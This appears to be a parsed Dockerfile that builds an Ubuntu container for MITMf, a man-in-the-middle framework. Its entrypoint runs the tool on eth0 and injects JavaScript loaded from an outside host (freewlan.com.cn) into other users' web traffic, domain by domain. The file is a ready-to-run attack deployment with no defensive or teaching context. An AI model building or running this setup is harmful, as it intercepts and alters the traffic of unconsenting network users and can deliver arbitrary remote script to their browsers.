MetaArgs: null
Stages:
- BaseName: ubuntu:wily
  Commands:
  - Maintainer: ZhangJing <13821320100@outlook.com>
    Name: maintainer
  - CmdLine:
    - apt-get update
    Name: run
    PrependShell: true
  - CmdLine:
    - apt-get install -y net-tools iptables tcpdump git file python-pip python-dev
      python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev
      libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev
    Name: run
    PrependShell: true
  - CmdLine:
    - git clone https://github.com/online2311/MITMf /MITMf
    Name: run
    PrependShell: true
  - Name: workdir
    Path: /MITMf
  - CmdLine:
    - git submodule init && git submodule update --recursive
    Name: run
    PrependShell: true
  - CmdLine:
    - pip install -r requirements.txt
    Name: run
    PrependShell: true
  - Name: volume
    Volumes:
    - /MITMf/logs/
  - Name: expose
    Ports:
    - "10000"
  - CmdLine:
    - python
    - /MITMf/mitmf.py
    - -i
    - eth0
    - --inject
    - --js-url
    - http://freewlan.com.cn/js_ad/js/ad.js
    - --per-domain
    Name: entrypoint
    PrependShell: false
  From:
    Image: ubuntu:wily
  Name: ""
  Platform: ""
  SourceCode: FROM ubuntu:wily
